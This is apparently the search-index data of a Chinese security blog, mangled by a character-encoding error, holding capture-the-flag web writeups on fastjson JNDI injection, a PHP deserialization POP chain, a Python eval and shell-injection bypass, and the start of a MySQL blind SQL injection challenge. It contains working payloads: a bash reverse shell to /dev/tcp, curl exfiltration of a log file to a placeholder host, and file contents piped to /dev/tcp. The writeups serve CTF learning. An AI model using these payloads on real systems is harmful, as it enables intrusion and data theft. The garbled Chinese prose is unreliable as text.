./\rä½†æ˜¯æœ‰ç‚¹é¸¡è‚‹ï¼ˆï¼‰\n","date":"2023-02-12T21:32:29+08:00","permalink":"https://koali-www.github.io/2023/volatilitydiary/","title":"Volatilityè¸©å‘æ—¥è®°"},{"content":" æ¬¢ è¿ å…‰ ä¸´ !\nå‰å‡ å¤©çªç„¶æƒ³èµ·è‡ªå·±è¿˜æœ‰ä¸ªåšå®¢ï¼Œè™½ç„¶ç»Ÿå…±åªå†™äº†å››ç¯‡ä¸æˆæ–‡çš„writeupè®°å½•ï¼Œä½†å¥½åƒä¹Ÿèƒ½å¤Ÿä½œä¸ºä¸€ä¸ªå¯ä»¥ç¢ç¢å¿µçš„åœ°æ–¹ã€‚äºæ˜¯å­å“§å­å“§å¼€å§‹æ­å»ºã€‚åŸå…ˆç”¨çš„hexoï¼ŒæŒ‘çš„ä¸»é¢˜ä¸æ˜¯å¾ˆå¥½çœ‹ï¼Œæœ€è¿‘é€›ç€é€›ç€å‘ç°hugoçš„stackçœ‹èµ·æ¥å¾ˆèˆ’æœï¼Œç›´æ¥æ‹¿æ¥ç”¨äº†ã€‚å¾ˆä¹…ä¸æ•²ä»£ç ï¼Œæ„Ÿè§‰å®¡è®¡èµ·æ¥å¾ˆå›°éš¾ï¼Œç€æ‰‹è£…ä¿®çš„è·¯åº”è¯¥ä¼šè¢«æˆ‘æ‹–å¾—è€é•¿\u0026hellip;\nä¸»é¢˜ç›´æ¥ä»å°çƒé£é±¼æä¾›çš„ä»“åº“ç…§æ¬,æ—¥åæœ‰æ—¶é—´å†æ…¢æ…¢æ”¹ã€‚\nåŸä¸»é¢˜åŸºç¡€ä¸Šçš„ä¿®æ”¹ ç®€å•é…ç½®æ›´æ”¹ æ ·å¼å¾®è°ƒ è¿™ä¸ªmodæ–°å¢çš„ä¸€äº›é¡µé¢å†…å®¹æ˜¯å†™æ­»çš„ï¼Œæ‰‹åŠ¨è°ƒæˆæ¨¡æ¿è°ƒç”¨ TODO: : é“¾æ¥é¡µã€å½’æ¡£é¡µæ ·å¼æ›´æ”¹ : æ·»åŠ ä¸€äº›å°åŠ¨ç”» : æ·»åŠ ä¸€ä¸‹è¯„è®ºç³»ç»Ÿï¼ˆåº”pyyçš„pushè¦æ±‚ï¼‰ : é‡å†™abouté¡µé¢ : æƒ³åˆ°äº†å†è¯´ è®°å½•ä¸€äº›å››å¤„æœåˆ®æ¥çš„æ–‡ç«  è‰ç¨¿ç®¡ç†\nå†™ä½œå·¥å…·\nhugoå»ºç«™ç¬”è®°\nåšå®¢æ—¥åç”¨é€” æ—¥å¸¸WriteUpè®°å½•ã€æŠ€æœ¯å­¦ä¹ ç¬”è®°ç­‰ç­‰ï¼ˆæŠ€æœ¯åšå®¢çœŸéš¾å†™..å¸Œæœ›æ–°å¹´åšæŒä¸€ä¸‹ï¼‰ ç¢ç¢å¿µæ‚è®° æƒ³åˆ°å†è¯´ ","date":"2023-02-10T00:37:33+08:00","image":"https://koali-www.github.io/2023/new-blog/87c01ec7gy1fsnqqlbdzjj21kw0w07is_hu6b3641bab08a4d9fcd9c17dbfb8d16cd_176708_120x120_fill_q75_box_smart1.jpg","permalink":"https://koali-www.github.io/2023/new-blog/","title":"é”µé”µï¼åšå®¢æ¬æ–°å®¶ãƒ¾(â‰§â–½â‰¦*)o"},{"content":"å†™åœ¨å‰é¢ å¾ˆé•¿æ—¶é—´æ²¡æ‰“æ¯”èµ›ï¼Œç”Ÿç–äº†å¾ˆå¤šã€‚è“å¸½æ¯çš„å–è¯é¢˜å¾ˆå‹å¥½ï¼Œå¥½ä¹…æ²¡åšå‡ºè¿™ä¹ˆå¤šé¢˜äº†å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼Œå’Œpyyå…±åŒè¡¨ç¤ºï¼šè™½ç„¶å†™äº†ä¸€å †æ°´é¢˜ï¼Œä½†æ˜¯å†™äº†å¾ˆå¤šé¢˜ï¼\nä¸è¿‡è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹fastjsonçš„jndiæ³¨å…¥æµç¨‹ã€‚æ„Ÿè°¢é«˜è¡¨å“¥çš„æŒ‡å¯¼( â€¢Ì€ Ï‰ â€¢Ì )âœ§\nEz_gadget fastjson 1.2.62\néœ€è¦ï¼š\nå¼€å¯autotype\nå¯¼å…¥xbean-reflect-3.4.jar\nå…¥å£ï¼š\nimage-20220709213554716\råœ¨å¼€å§‹æ³¨å…¥ä¹‹å‰ï¼Œéœ€è¦ç»•è¿‡hashCode()å’Œequals()çš„æ¯”è¾ƒã€‚javaé‡Œï¼ŒStringç±»é‡å†™äº†Objectçš„hashCodeï¼š\nimage-20220709214050723\rç›¸å…³çš„è§£é‡Šå’Œå‚è€ƒèµ„æ–™ç½‘ä¸Šæœ‰å¾ˆå¤šã€‚é€šä¿—æ¥è¯´ï¼Œå› ä¸ºhashCodeè¿”å›çš„æ˜¯ä¸€ä¸ªintï¼Œè€Œä¸”è¿‡ç¨‹æ˜¯å¯¹å­—ç¬¦ä¸²åˆ†ç»„æ‰§è¡ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥è§£å¯†è¿‡ç¨‹åŒæ ·å¯ä»¥è¿›è¡Œæ‹†åˆ†ã€‚åŸç†æ˜¯ä¸­é—´ç›¸é‡æ”»å‡»ã€‚ç½‘ä¸Šæ‰¾äº†ç”Ÿæˆçš„ä»£ç ï¼Œæ‹¿ç»™å®šçš„keyç›´æ¥ç”Ÿæˆå°±å¯ä»¥äº†ã€‚\næ¥ä¸‹æ¥è¦è€ƒè™‘ç»•è¿‡æ­£åˆ™ï¼Œjsonæ˜¯æ”¯æŒunicodeç¼–ç çš„ï¼Œæ‰€ä»¥å¯ä»¥æŠŠå…³é”®çš„å†…å®¹ç”¨unicodeç¼–ç ä»£æ›¿ï¼Œè¿™é‡Œå°±å…¨éƒ¨ç¼–ç æ›¿ä»£äº†ã€‚\næœ€åæ˜¯fastjsonæ³¨å…¥ã€‚æŸ¥çœ‹æºç å¯ä»¥å‘ç°è¿™ä¸ªé¡¹ç›®é‡Œå¯¼å…¥äº†xbean-reflect-3.4.jaråŒ…ï¼Œé‡Œé¢çš„propertyeditor.JndiConverterç±»æœ‰å¯æ§ç‚¹ï¼š\nimage-20220709220927698\rç»å…¸çš„jndiæ³¨å…¥æ¼æ´ç‚¹ï¼Œç°æˆçš„payloadä¹Ÿå¾ˆå¤šï¼Œæ‰¾ä¸€ä¸ªèƒ½ç”¨çš„ï¼š\n{\u0026quot;@type\u0026quot;:\u0026quot;org.apache.xbean.propertyeditor.JndiConverter\u0026quot;,\u0026quot;AsText\u0026quot;:\u0026quot;rmi://127.0.0.1:1099/exploit\u0026quot;}\rè¿™é‡Œæœ¬åœ°ç¯å¢ƒå°±ç›´æ¥å¼¹è®¡ç®—å™¨äº†ã€‚å¼¹shellçš„è¯æŠŠæ‰§è¡Œå‘½ä»¤æ”¹æˆbash -i \u0026gt;\u0026amp; /dev/tcp/xx.xx.xx.xx/1099 0\u0026gt;\u0026amp;1å°±è¡Œäº†ã€‚\nåŒæ ·ä¹Ÿæœ‰ç°æˆçš„å·¥å…·ï¼ˆå½“ç„¶è‡ªå·±æ­rmiä¹Ÿå¯ä»¥ï¼‰\nimage-20220709223610356\rpayloadï¼š\nstr=9P5JBmvCKwa8awgNWjY_gmj\u0026amp;input={\u0026quot;@type\u0026quot;:\u0026quot;\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061\\u0063\\u0068\\u0065\\u002e\\u0078\\u0062\\u0065\\u0061\\u006e\\u002e\\u0070\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0065\\u0064\\u0069\\u0074\\u006f\\u0072\\u002e\\u004a\\u006e\\u0064\\u0069\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\u0026quot;,\u0026quot;AsText\u0026quot;:\u0026quot;\\u0072\\u006d\\u0069\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0031\\u0030\\u0039\\u0039\\u002f\\u007a\\u0062\\u007a\\u0077\\u0074\\u0038\u0026quot;}\rå‚è€ƒé“¾æ¥ ç”ŸæˆHashCodeä¸€è‡´çš„å­—ç¬¦ä¸²\nçº¢é˜Ÿæ­¦å™¨åº“:fastjsonå°äº1.2.68å…¨æ¼æ´RCEåˆ©ç”¨expå¤ç°\nFastjson \u0026lt;=1.2.62 è¿œç¨‹ä»£ç æ‰§è¡Œ-æ¼æ´å¤ç°\næµ…æFastjson1.2.62-1.2.68ååºåˆ—åŒ–æ¼æ´\njndi_tool\nJNDI-Injection-Exploit\nå¦‚ä½•ç»•è¿‡é«˜ç‰ˆæœ¬ JDK çš„é™åˆ¶è¿›è¡Œ JNDI æ³¨å…¥åˆ©ç”¨\næ·±å…¥ç†è§£JNDIæ³¨å…¥ä¸Javaååºåˆ—åŒ–æ¼æ´åˆ©ç”¨\nå†™åœ¨æœ€å javaé¢˜æ‰“çš„å¤ªå°‘äº†ï¼ŒåŸºæœ¬ä¸Šçœ‹åˆ°javaå°±æ”¾å¼ƒäº†ï¼Œä½†æ˜¯ä»Šå¤©ä¸€æ­¥ä¸€æ­¥èµ°ä¸‹æ¥æ”¶è·è¿˜æ˜¯è›®å¤§çš„ï¼Œè™½ç„¶JNDIæ³¨å…¥æ¼æ´è¿˜æ˜¯æ²¡æœ‰å¤ªæ˜ç™½ã€‚è¿™ä¸€ç¯‡ç¨å¾®è®°å½•ä¸€ä¸‹æ‰“çš„è¿‡ç¨‹ï¼Œä¹‹åä¼šå¼€å§‹å¤ç°å„ç§JNDIæ³¨å…¥çš„æ´ï¼Œæ…¢æ…¢æŠŠåˆ†æè¡¥ä¸Šã€‚åŒ…æ‹¬å„ç§å·¥å…·çš„ä½¿ç”¨ï¼Œåœ¨åˆ©ç”¨ç‚¹ä¸Šä¹Ÿæœ‰ä¸€å®šåŒºåˆ«ï¼Œè¿™å¯¼è‡´ä»Šå¤©èŠ±äº†å¾ˆå¤šæ—¶é—´è¸©å‘ï¼Œä¹‹åä¸€å¹¶å†™åˆ°æ€»ç»“é‡Œã€‚\nå…ˆå¼€ä¸ªå‘ï¼Œæºœå•¦~\n","date":"2022-07-09T00:00:00Z","permalink":"https://koali-www.github.io/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/","title":"è“å¸½æ¯2022"},{"content":"å†™åœ¨å‰é¢ DASCTFæ²¡æœ‰å¥½å¥½æ‰“ï¼Œä½œä¸šå¤ªå¤šäº†ä¸€ç›´åœ¨èµ¶ddlã€‚ä½†æ˜¯å¥½åƒç¡®å®ä¸æ˜¯å¾ˆéš¾çš„æ ·å­ï¼Œå†™ä¸å‡ºæ¥æœç„¶è¿˜æ˜¯æˆ‘å¤ªèœäº†\u0026hellip;\nä»¥åŠï¼Œå¸Œæœ›ä»¥åæŠ½ç©ºå¤šåšåšé¢˜å­(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»*)\nezpop å…ˆæ”¾æºç \n\u0026lt;?php\rclass crow\r{\rpublic $v1;\rpublic $v2;\rfunction eval() {\recho new $this-\u0026gt;v1($this-\u0026gt;v2);\r}\rpublic function __invoke()\r{\r$this-\u0026gt;v1-\u0026gt;world();\r}\r}\rclass fin\r{\rpublic $f1;\rpublic function __destruct()\r{\recho $this-\u0026gt;f1 . '114514';\r}\rpublic function run()\r{\r($this-\u0026gt;f1)();\r}\rpublic function __call($a, $b)\r{\recho $this-\u0026gt;f1-\u0026gt;get_flag();\r}\r}\rclass what\r{\rpublic $a;\rpublic function __toString()\r{\r$this-\u0026gt;a-\u0026gt;run();\rreturn 'hello';\r}\r}\rclass mix\r{\rpublic $m1;\rpublic function run()\r{\r($this-\u0026gt;m1)();\r}\rpublic function get_flag()\r{\reval('#' . $this-\u0026gt;m1);\r}\r}\rif (isset($_POST['cmd'])) {\runserialize($_POST['cmd']);\r}\relse{\rhighlight_file(__FILE__);\r}\rå¤ªä¹…æ²¡æœ‰å†™phpçš„ååºåˆ—åŒ–äº†ï¼Œé­”æœ¯æ–¹æ³•æ€ä¹ˆè§¦å‘éƒ½å¿˜å¾—å·®ä¸å¤šäº†ï¼Œæ‰€ä»¥ç¿»å‡ºäº†y4çš„æ€»ç»“åˆè·Ÿç€çœ‹äº†ä¸€éï¼ˆè®°æ€§å·®çœŸçš„å¥½çƒ¦å•Šï¼‰\n__invoke() åœ¨å¯¹è±¡è¢«ä½œä¸ºå‡½æ•°è°ƒç”¨æ—¶è§¦å‘\r__destruct() åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘\r__call() åœ¨è°ƒç”¨æœªçŸ¥æˆ–è€…ä¸å¯è®¿é—®çš„å‡½æ•°æ—¶è§¦å‘\r__toString() åœ¨å¯¹è±¡è¢«ä½œä¸ºå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘(æ¯”å¦‚æ‰“å°å•¦ã€æ‹¼æ¥å•¦..)\ré¦–å…ˆæ³¨æ„åˆ°mixç±»é‡Œé¢çš„get_flagå‡½æ•°é‡Œæœ‰ä¸€ä¸ªevalï¼Œæ‰€ä»¥å…¥å£åº”è¯¥å°±æ˜¯è¿™é‡Œã€‚äºæ˜¯å¯ä»¥åæ¨å‡ºpopé“¾åº”è¯¥æ€ä¹ˆæ„é€ ã€‚\nget_flagé‡Œé¢æœ‰ä¸€ä¸ªevalå‡½æ•°,æ˜æ˜¾æˆ‘ä»¬éœ€è¦åˆ©ç”¨è¿™ä¸ªç‚¹è¿›è¡Œå‘½ä»¤æ‰§è¡Œ.ä¸ºäº†æ‘¸åˆ°è¿™ä¸ªeval,éœ€è¦m1å¯æ§,è¿˜è¦æ‰§è¡Œget_flag();åœ¨finé‡Œé¢è°ƒç”¨__callå¯ä»¥ä½¿f1è°ƒç”¨get_flag(),ä¸ºäº†è°ƒç”¨__callï¼Œå¯ä»¥åˆ©ç”¨crowé‡Œçš„__invokeï¼Œä½¿v1è°ƒç”¨æœªçŸ¥å‡½æ•°è€Œè§¦å‘__call;ä¸ºäº†è°ƒç”¨__invoke,åˆéœ€è¦å°†æŸä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°è§¦å‘ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨finçš„runæˆ–è€…mixçš„run;ä¸ºäº†è°ƒç”¨runï¼Œéœ€è¦è¿›åˆ°__toStringé‡Œï¼Œä½†æ˜¯è§¦å‘è¿™ä¸ª__toString()åˆéœ€è¦å°†å¯¹è±¡ä½œä¸ºå­—ç¬¦ä¸²è°ƒç”¨ï¼Œæ‰€ä»¥è‡ªç„¶å°±è¿›å…¥__destructè°ƒç”¨é‡Œé¢çš„å­—ç¬¦ä¸²æ‹¼æ¥ã€‚åˆ†æå®Œä»¥ä¸Šçš„é—®é¢˜ï¼Œå°±å¯ä»¥æ„é€ popé“¾äº†ã€‚\næµç¨‹ä¸»è¦æ˜¯:\rfin::_destruct()\rwhat::__toString()\rfin::run()/mix::run()\rcrow::__invoke()\rfin::__call()\rmix::get_flag()\ræ‰€ä»¥å®šä¹‰å¦‚ä¸‹çš„å˜é‡ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥é‡æ–°æ„é€ ç±»ï¼‰\n$mix = new mix();\r$mix-\u0026gt;m1 = \u0026quot;\\nsystem('whoami');\u0026quot;; // m1æ˜¯éœ€è¦æ‹¼æ¥è¿›evalçš„å‘½ä»¤ã€‚\r$fin3 = new fin();\r$fin3-\u0026gt;f1 = $mix;\r$crow = new crow();\r$crow-\u0026gt;v1 = $fin3;\r//$mix2 = new mix(); //$mix2-\u0026gt;m1 = $crow;\r$fin2 = new fin(); // è¿™é‡Œçš„fin2æ¢æˆä¸Šé¢çš„mix2åŒæ ·å¯ä»¥å®ç°ï¼Œæ•ˆæœä¸€æ ·çš„\r$fin2-\u0026gt;f1 = $crow;\r$what = new what();\r$what-\u0026gt;a = $fin2;\r$fin = new fin();\r$fin-\u0026gt;f1 = $what;\recho serialize($fin);\runserialize(serialize($fin));\rè¿™é‡Œæœ‰ä¸€ä¸ªç‚¹æ˜¯evalé‡Œé¢æ‹¼æ¥äº†æ³¨é‡Šç¬¦å·#ï¼Œä¸ºäº†ç»•è¿‡è¿™ä¸ªæ³¨é‡Šï¼Œå¯ä»¥å†™å…¥\\næ¥ç»•è¿‡ã€‚ä¸è¿‡æœ‰ä¸€ç‚¹æ¯”è¾ƒå‘çš„æ˜¯hackbarä¸èƒ½ä¼ è¿›æ¢è¡Œï¼Œå¥½åƒburpä¹Ÿä¸è¡Œï¼Œæ‰€ä»¥æœ€åé‡‡ç”¨pythonå‘åŒ…æ‰“çš„è¿œç¨‹ã€‚ä»¥åŠåœ¨è¿™é‡Œé‡åˆ°äº†phpå•å¼•å·å’ŒåŒå¼•å·å­—ç¬¦è½¬ä¹‰çš„é—®é¢˜ï¼Œæˆ‘ä¸€å®šæ˜¯æœ€åä¸€ä¸ªçŸ¥é“phpçš„å•å¼•å·å†…å­—ç¬¦ä¸²åªè½¬ä¹‰æ–œæ å’Œå•å¼•å·çš„å­55555\nå¯¹äº†ï¼Œç›®å½•ä¸‹é¢æœ‰å¾ˆå¤šçš„æ–‡ä»¶ï¼Œå…¶å®åªè¦æ‰§è¡Œcat *ï¼Œæˆ–è€…cat `ls` å°±å¯ä»¥äº†ï¼Œä½†æ˜¯å½“æ—¶æ²¡æ³¨æ„ï¼Œè¿˜ä»¥ä¸ºflagæ”¾åœ¨å…¶ä»–çš„ç›®å½•ä¸‹é¢ï¼Œæˆ‘ç¿»éäº†éƒ½æ²¡æ‰¾åˆ°ã€‚è°çŸ¥é“å°±åœ¨å½“å‰ç›®å½•ä¸‹é¢TT ( zyx : éƒ½åˆ°è¿™é‡Œäº†ï¼Œè‚¯å®šä¸ä¼šä¸ºéš¾ä½ çš„å•¦~ : )å¥½å­\ncalc è¿™é“é¢˜å…¶å®å®Œå…¨æ²¡çœ‹..æ˜¯èµ›åç…§ç€wpè¡¥çš„é¢˜ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹ä¸¤ç§è§£æ³•ã€‚éƒ½éå¸¸å¥½ï¼Œå€¼å¾—å­¦ä¹ ã€‚\nå…ˆè´´ä¸Šæºç \n#coding=utf-8\rfrom flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory\rimport random\rfrom urllib import parse\rimport os\rfrom werkzeug.utils import secure_filename\rimport time\rapp=Flask(__name__)\rdef waf(s):\rblacklist = ['import','(',')',' ','_','|',';','\u0026quot;','{','}','\u0026amp;','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']\rflag = True\rfor no in blacklist:\rif no.lower() in s.lower():\rflag= False\rprint(no)\rbreak\rreturn flag\r@app.route(\u0026quot;/\u0026quot;)\rdef index():\r\u0026quot;æ¬¢è¿æ¥åˆ°SUctf2022\u0026quot;\rreturn render_template(\u0026quot;index.html\u0026quot;)\r@app.route(\u0026quot;/calc\u0026quot;,methods=['GET'])\rdef calc():\rip = request.remote_addr\rnum = request.values.get(\u0026quot;num\u0026quot;)\rlog = \u0026quot;echo {0} {1} {2}\u0026gt; ./tmp/log.txt\u0026quot;.format(time.strftime(\u0026quot;%Y%m%d-%H%M%S\u0026quot;,time.localtime()),ip,num)\rif waf(num):\rtry:\rdata = eval(num)\ros.system(log)\rexcept:\rpass\rreturn str(data)\relse:\rreturn \u0026quot;waf!!\u0026quot;\rif __name__ == \u0026quot;__main__\u0026quot;:\rapp.run(host='0.0.0.0',port=5000) è¿™é‡Œä¸»è¦çš„è€ƒç‚¹æ˜¯å¦‚ä½•ç»•è¿‡eval()ä¸os.systemå‘½ä»¤æ‰§è¡Œã€‚å› ä¸ºé»‘åå•é‡Œbanäº†å¾ˆå¤šå¾ˆå¤šä¸œè¥¿ï¼Œå‰©ä¸‹çš„å‡ ä¹æ²¡æœ‰å¤šå°‘ï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªä¹ æƒ¯å‘äºŒå¸ˆå‚…å­¦ä¹ ï¼Œåœ¨ç¢°åˆ°å¤§é‡çš„é»‘åå•è¿‡æ»¤çš„æ—¶å€™ï¼Œè€ƒè™‘å®ƒæ²¡æœ‰è¿‡æ»¤çš„ä¸œè¥¿ï¼Œå†å»æ‰¾è§£é¢˜æ€è·¯ï¼‰ï¼Œä½†æ˜¯å‰©ä¸‹çš„ä¸œè¥¿éƒ½å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚è¯´'#','`','\u0026gt;','$',\u0026quot;'\u0026quot;ã€‚\næ‰€ä»¥å…ˆçœ‹çœ‹ç¬¬ä¸€ç§è§£æ³•ã€‚\nè§£æ³•ä¸€ #åœ¨pythoné‡Œæ˜¯æ³¨é‡Šç¬¦ï¼Œåé¢è·Ÿç€çš„å†…å®¹ä¼šè¢«æ³¨é‡Šæ‰ä¸è§£æã€‚æ‰€ä»¥å¦‚æœä¼ å…¥çš„numæ˜¯\n1#123\ré€šè¿‡evalè§£æå‡ºæ¥çš„å†…å®¹å°±åªæ˜¯ä¸ª1\nimage-20220328200628532\rè¿™ä¸€ç‚¹å¾ˆç¥å¥‡ï¼ŒåŸæ¥pythoné‡Œé¢å¥½å¤šå‡½æ•°åœ¨è§£æå­—ç¬¦ä¸²çš„æ—¶å€™ä¼šæŠŠæ³¨é‡Šç¬¦åé¢è·Ÿç€çš„æ³¨é‡Šæ‰ï¼ŒæŸ¥äº†å¾ˆä¹…èµ„æ–™ä¹Ÿæ²¡æœ‰æŸ¥åˆ°ä¸€ä¸ªå®˜æ–¹ç»™çš„è¯´æ³•ï¼ˆå¥½å­æ˜¯æˆ‘èœï¼‰\nä½†æ˜¯å¦‚æœæ˜¯os.systemï¼Œä¼ åˆ°shellé‡Œé¢ä¼šæŠŠ#çœ‹ä½œå­—ç¬¦è€Œéæ³¨é‡Šç¬¦ã€‚æ‰€ä»¥å°è¯•æ‹¼æ¥è¿™ä¸ªecho {0} {1} {2}\u0026gt; ./tmp/log.txtæ¥è®©os.systemæ‰§è¡Œã€‚é¦–å…ˆæ¥çœ‹ä¸€ä¸‹åœ¨bashé‡Œé¢çš„ç»“æœã€‚\nimage-20220328202428403\ræ‰§è¡Œä¹‹åï¼Œæ‰“å¼€log.txtï¼Œå¯ä»¥çœ‹åˆ°åå¼•å·é‡Œé¢çš„å‘½ä»¤è¢«æ‰§è¡Œå¹¶ä¸”å°†ç»“æœè¾“å…¥log.txtäº†\nimage-20220328202502583\ræ‰€ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥è€ƒè™‘ä¼ å…¥ä¸€ä¸ªå¯ä»¥è®©os.systemæ‰§è¡Œçš„å‘½ä»¤ï¼Œå°è¯•å¤–å¸¦å‡ºç»“æœã€‚è¿™é‡Œç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘å…¶ä»–çš„ç©ºç™½ç¬¦ã€‚\nå¯ä»¥å…ˆå†™å…¥å†å¤–å¸¦ã€‚\npayload\nnum = 1%23`ls%09/`%23\rnum = 1%23`curl%09-F%09xx=@tmp/log.txt%09http://ip:port/`%23\räºŒå¸ˆå‚…ç»™çš„payloadæ˜¯ç›´æ¥å¤–å¸¦ã€‚\npayload\nnum = 1%23%60%2Fbin%2Fbash%09-c%09%27cat%09.%2F*%3E%2Fdev%2Ftcp%2Fip%2Fport%27%60%3E\ræœåŠ¡å™¨è¿™å¤´ç›‘å¬ä¸€ä¸‹å°±è¡Œã€‚\nimage-20220329171534234\rimage-20220329160322856\rè§£æ³•äºŒ åˆ©ç”¨pythonçš„ä¸‰å¼•å·æ„é€ å¤šè¡Œå­—ç¬¦ä¸²ï¼Œä¸‰å¼•å·æ‹¬èµ·æ¥çš„å†…å®¹åœ¨evalé‡Œè¢«å½“ä½œå­—ç¬¦ä¸²ï¼Œæ˜¯ä¸ä¼šæŠ¥é”™çš„ã€‚æ¯”å¦‚è¯´ï¼š\nimage-20220329173754460\ræ—¢ç„¶è¿‡äº†evalï¼Œé‚£æ¥ä¸‹æ¥å¼€å§‹è€ƒè™‘æ€ä¹ˆè®©shellæ‰§è¡Œã€‚å…ˆæ¥çœ‹çœ‹shellé‡Œé¢ä¸‰å¼•å·çš„ååº”ã€‚é¦–å…ˆshellæ˜¯æ”¯æŒå¤šè¡Œå­—ç¬¦ä¸²çš„ï¼Œç¬¬ä¸€ç¬¬äºŒä¸ªè¾“å‡ºå¯ä»¥çœ‹å‡ºæ¥ã€‚å¹¶ä¸”shellé‡Œé¢å¯¹å¤šä¸ªå•å¼•å·ï¼Œä¸€èˆ¬æ˜¯é‡‡å–é—­åˆçš„åŠæ³•æ¥è¯†åˆ«ï¼Œçœ‹ç¬¬ä¸‰ä¸ªè¾“å‡ºã€‚å†åŠ ä¸Šshellé‡Œé¢ï¼Œä»¥#å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“ä½œæ³¨é‡Šï¼Œä¸äºˆè¾“å‡ºï¼Œçœ‹ç¬¬å››ä¸ªä¾‹å­ã€‚\nimage-20220329173926144\ræ‰€ä»¥æ ¹æ®evalå’Œshellå¯¹å¾…ä¸‰å¼•å·å­—ç¬¦ä¸²çš„ä¸åŒè§£é‡Šï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹è¾“å…¥ï¼š\n'''1'\\nls\\n#'3'''\ræŠŠè¿™ä¸ªè¾“å…¥æ‹¼æ¥åˆ°echoé‡Œé¢å°±æ˜¯\necho {0} {1} '''1'\rls\r#'3'''\u0026gt; ./tmp/log.txt\ræˆåŠŸå‘½ä»¤æ‰§è¡Œã€‚\nè¿™é‡Œä¸ºäº†æ‹¿åˆ°flagï¼Œå¯ä»¥ç›´æ¥å¤–å¸¦\npayload\nnum = %27%27%271%27%0Acat%0A/*%09%3E%09/dev/tcp/x.x.x.x/port%0A%23%273%27%27%27\rå‚è€ƒèµ„æ–™ DASCTF X SU 2022 writeup\n2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ› WriteUp\n[CTF]PHPååºåˆ—åŒ–æ€»ç»“\nå†™åœ¨åé¢ åˆæ°´äº†ä¸€åœºæ¯”èµ›ï¼Œä¸è¿‡è¿˜æ˜¯å­¦åˆ°ä¸œè¥¿äº†ã€‚ä»¥å‰æ²¡èƒ½æŠŠç›¸åº”çš„çŸ¥è¯†ç‚¹è®°å½•ä¸‹æ¥çœŸçš„æœ‰ä¸€ç‚¹å¯æƒœï¼ˆå¾ˆå¤§ä¸€éƒ¨åˆ†åŸå› æ˜¯ç¬”è®°ä¸¢äº†23333ï¼‰ï¼Œä¸è¿‡å¤§éƒ¨åˆ†çš„äº‹æƒ…ä»€ä¹ˆæ—¶å€™å¼€å§‹éƒ½ä¸ç®—æ™šå§ï¼ˆå¤§æ¦‚ï¼‰ã€‚\nåŠ æ²¹åŠ æ²¹ã€‚\n","date":"2022-03-30T00:00:00Z","permalink":"https://koali-www.github.io/2022/dasctfxsuctf-web-writeup/","title":"DASCTFxSUCTF-web-writeup"},{"content":"å†™åœ¨å‰é¢ æ‰“è™ç¬¦CTFï¼Œå¼€å¤´å°±è¢«å¹³å°æŒ¡åœ¨å¤–é¢äº†:D\nwebä¸€å¦‚æ—¢å¾€çš„éš¾ï¼Œbabysqlçœ‹èµ·æ¥å¯åšä¸€äº›ï¼Œå°±ä»è¿™é“é¢˜å¼€å§‹ã€‚æ­¤å¤„æ„Ÿè°¢é«˜è¡¨å“¥å’Œnkkçš„æŒ‡å¯¼å’Œpyyçš„è„‘æ´ã€‚\nç–«æƒ…ç‰¹æ®Šæ—¶æœŸï¼Œä¸èƒ½çº¿ä¸‹èšé›†æ‰“æ¯”èµ›è¿˜æ˜¯æœ‰ç‚¹å¯æƒœï¼Œå®éªŒå®¤ä¸‰ä¸ªwebæ‰‹ç»™äºŒå¸ˆå‚…æ‰“ä¸‹æ‰‹(bushi)\nè§£é¢˜è¿‡ç¨‹ image-20220320142246038\rIt is a pure sql injection challenge. Login any account to get flag. Have fun with mysql 8. There is something useful in /hint.md.\nå‰å°é™åˆ¶äº†è¾“å…¥ï¼Œè¿™ä¸ªä¸è¦ç´§ï¼Œå¯ä»¥é€šè¿‡pythonæˆ–è€…burpå‘åŒ…è¿‡å»ã€‚\nimage-20220320142647728\réšä¾¿è¾“å…¥ç™»å½•ä¸€ä¸‹ã€‚\nç»™äº†ä¸ªè¿”å›å€¼ã€‚å¦‚æœè¦æ³¨å…¥çš„è¯åªèƒ½æ ¹æ®è¿™ä¸ªè¿”å›å€¼åˆ¤æ–­ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä¸ªç›²æ³¨ã€‚\n{\u0026quot;statusCode\u0026quot;:401,\u0026quot;message\u0026quot;:\u0026quot;Unauthorized\u0026quot;}\ræ®é¢˜ç›®æ‰€è¯´èƒ½æ³¨å‡ºè´¦å·å¯†ç å°±ç»™flagã€‚ç„¶åå¾ˆè´´å¿ƒç»™äº†ä¸€ä¸ªhintï¼Œå…ˆè¿›å»çœ‹çœ‹ã€‚\n```sql\rCREATE TABLE `auth` (\r`id` int NOT NULL AUTO_INCREMENT,\r`username` varchar(32) NOT NULL,\r`password` varchar(32) NOT NULL,\rPRIMARY KEY (`id`),\rUNIQUE KEY `auth_username_uindex` (`username`)\r) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;\r```\r```js\rimport { Injectable } from 